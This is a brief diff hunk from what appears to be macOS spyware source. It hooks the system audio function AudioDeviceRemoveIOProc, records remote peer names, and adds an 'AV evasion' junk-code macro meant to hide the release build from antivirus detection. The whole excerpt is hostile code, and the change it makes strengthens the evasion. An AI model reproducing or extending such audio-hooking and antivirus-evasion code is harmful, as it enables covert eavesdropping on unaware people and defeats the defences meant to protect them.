@@ -1542,6 +1542,9 @@ _hook_AudioDeviceRemoveIOProc (AudioDeviceID       inDevice,
         AV_GARBAGE_003
         
         [gRemotePeerName appendFormat: @", %@", peer];
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_001
       }
     }
     [peerLock unlock];
